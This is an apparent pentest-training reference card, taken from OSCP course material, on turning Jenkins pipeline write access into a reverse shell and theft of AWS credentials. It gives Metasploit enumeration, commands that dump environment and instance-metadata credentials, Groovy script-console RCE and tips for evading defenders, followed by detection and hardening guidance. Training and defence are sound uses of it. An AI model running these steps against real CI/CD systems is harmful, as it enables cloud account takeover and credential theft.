name: AWS - Jenkins Pipeline Modification for RCE & Credential Theft
description: Jenkins pipelines that have write access to their Jenkinsfile (in SCM or directly) can be modified to inject arbitrary shell commands. The withAWS() pipeline step injects IAM credentials as environment variables — running a reverse shell inside this block leaks those credentials. The shell spawns as the jenkins user running in a Docker container (for cloud-based Jenkins). After getting shell, 'env | grep AWS' dumps the injected AWS access key ID and secret from the process environment.
source: OSCP PEN-200 Chapter 25: Attacking AWS Cloud Infrastructure (25.5.2, 25.5.3)

examples.label: Enumerate Jenkins with MSF auxiliary scanner
examples.command:
msf6 > use auxiliary/scanner/http/jenkins_enum
msf6 auxiliary(scanner/http/jenkins_enum) > set RHOSTS app.offseclab.io
msf6 auxiliary(scanner/http/jenkins_enum) > set RPORT 80
msf6 auxiliary(scanner/http/jenkins_enum) > run
# Check: Jenkins version, auth status, build history, user enumeration

examples.label: Directory brute-force Jenkins for hidden endpoints
Read existing Jenkinsfile to find withAWS credential binding
Inject reverse shell into withAWS block in Jenkinsfile
Trigger the pipeline build (via Jenkins UI or API)
In received shell - dump AWS environment variables
examples.command:
env | grep AWS
# AWS_ACCESS_KEY_ID=AKIA...
# AWS_SECRET_ACCESS_KEY=...
# AWS_DEFAULT_REGION=us-east-1

examples.label: Confirm container context (not bare metal)
examples.command:
cat /proc/mounts | grep overlay
# overlay filesystem = Docker container

examples.label: Configure stolen Jenkins AWS credentials
examples.command:
aws configure --profile jenkins-creds
# Enter the captured AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY
aws --profile jenkins-creds sts get-caller-identity

notes: The withAWS() step is from the AWS Steps Jenkins plugin — it retrieves credentials stored in Jenkins Credential Manager and injects them as environment variables for the duration of the block. This is the intended functionality, but it makes credentials accessible to any code running in that block. Jenkins may run builds in Docker containers (cloud agents) — the container shares environment variables with the build process. Even short-lived reverse shells work: the '&' backgrounds the reverse shell so the build continues (avoids immediate pipeline failure that might alert defenders). If the Jenkins instance runs on EC2, also check for instance metadata: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/' to get the attached IAM role credentials. The jenkins_enum MSF auxiliary scanner (exam-ok) reveals Jenkins version, authentication state, and configured jobs without authentication.

recommended.note: S3 bucket download may reveal the app source with the Jenkinsfile.
After shell in Jenkins container, enumerate the container environment for AWS creds.
Scope permissions of the stolen Jenkins AWS credentials.
If Jenkins Script Console is exposed, use Groovy RCE instead of pipeline modification.

defense.why_it_works: Jenkins pipelines execute as a service account that often has AWS credentials (as environment variables or AWS credentials file) to deploy infrastructure. A malicious Jenkinsfile or compromised pipeline job can execute arbitrary commands — accessing the credentials and calling AWS APIs. Jenkins Script Console (Groovy) provides direct RCE if accessible. Compromised pipeline = access to all AWS credentials configured in Jenkins (often admin-level deployment credentials).
defense.prerequisites: Jenkins instance accessible (web UI, API). Admin or job-configure access to Jenkins. OR compromise of source code repository feeding a Jenkins pipeline. Jenkins has AWS credentials configured. AWS CLI available on the Jenkins agent.
defense.impact: T1059.004 Command and Scripting Interpreter: Unix Shell + T1552.001 Credentials In Files + T1612 Build Image on Host. Executes code in the CI/CD environment with all configured credentials — typically high-privilege AWS credentials for deployment. From Jenkins compromise: access to all AWS environments the pipeline deploys to (dev/staging/prod), all secrets in Jenkins credential store, and ability to inject malicious code into deployment artifacts.
defense.detection:
Jenkins audit log: new pipeline job execution, Groovy script execution, credential access. CloudTrail: AWS API calls using CI/CD IAM role from Jenkins IP address (but different time/pattern than normal pipeline runs). AWS CloudTrail: API calls at unusual times or for unusual services from the CI/CD role. Jenkins: new Jenkinsfile with credential exfiltration commands.
Scripting interpreters (powershell.exe, cmd.exe, wscript.exe) executing outside expected time windows or from abnormal user contexts (DET0516).
Shell interpreters (bash, sh, python, perl) initiated by unexpected users or processes chaining netcat/curl/ssh.
macOS scripting launched via Terminal/Automator/hidden osascript with unusual parent process.
ESXi busybox shell spawned from SSH unexpectedly; network device CLI from uncommon accounts or unknown IPs.
defense.artifacts: Jenkins audit log: script console execution or unusual job | CloudTrail: AWS API calls from CI/CD role at unusual time | Jenkins: new environment variable access in job log | Network: outbound connection from Jenkins agent to attacker | Git: malicious Jenkinsfile commit
defense.prevention:
Jenkins access control: require authentication, use RBAC (Jenkins built-in or LDAP). Protect Jenkins with network controls (not internet-accessible). Jenkinsfile in git: review pipeline changes as part of code review. Least-privilege Jenkins AWS role: only permissions needed for the specific deployment. Separate credentials per environment (Jenkins role can only deploy to dev — not prod). Jenkins Credentials Plugin: mask credentials in logs. GuardDuty: detect anomalous CI/CD role usage.
Antivirus/Antimalware: Auto-quarantine of malicious scripting interpreter activity.
Audit: Inventory interpreter usage to detect unexpected scripting binaries.
Behavior Prevention on Endpoint: Windows 10 ASR rules blocking VBScript and JScript execution.
Code Signing: Permit only signed scripts; block unsigned interpreter executions.
Disable or Remove Feature or Program: Remove unused shells and scripting interpreters.
Execution Prevention: Application control (WDAC/AppLocker); PowerShell Constrained Language Mode (restrict Add-Type).
Privileged Account Management: Restrict PowerShell execution policy to admins; use PowerShell Just Enough Administration (JEA).
Restrict Web-Based Content: Script-blocking browser extensions and ad blockers.
defense.evasion: Access Jenkins Script Console directly rather than modifying Jenkinsfile (if admin access available — no git trace). Trigger during normal deployment windows to blend with legitimate CI/CD traffic. Use env var extraction in job that outputs to an artifact rather than making outbound connection.
defense.misconfiguration: Jenkins internet-accessible with weak/default credentials. Jenkins service account has production AWS admin credentials. No approval gate for Jenkinsfile changes. Jenkins Script Console enabled for all admins without audit. All AWS environments use same Jenkins IAM role (no environment separation).
defense.vulnerable_config:
# Jenkins Script Console RCE (Groovy):
# Navigate to: http://jenkins/script
# println 'id'.execute().text
# → Executes as Jenkins service account

# AWS credentials in Jenkins environment:
# println System.getenv('AWS_ACCESS_KEY_ID')
# → AKIAIOSFODNN7EXAMPLE (plaintext)

# Same admin role for all environments:
aws iam get-role --role-name jenkins-deploy
# → AdministratorAccess policy attached = full admin on all environments
defense.secure_config:
# Restrict Jenkins Script Console to no one (or specific admin IP):
# Jenkins → Manage Jenkins → Security → Script Console: Disable or restrict

# Least-privilege, environment-separated roles:
# jenkins-deploy-dev: deploy to dev only
# jenkins-deploy-prod: deploy to prod only, requires 2-person approval

# Pipeline approval for prod deployments:
# Jenkinsfile:
# stage('Deploy to Prod') {
#   input message: 'Approve deployment to production?', submitter: 'prod-approvers'
# }

# Jenkins network: not internet-accessible
# Place behind VPN / corporate network only

# Scan Jenkinsfile for credential access patterns in code review
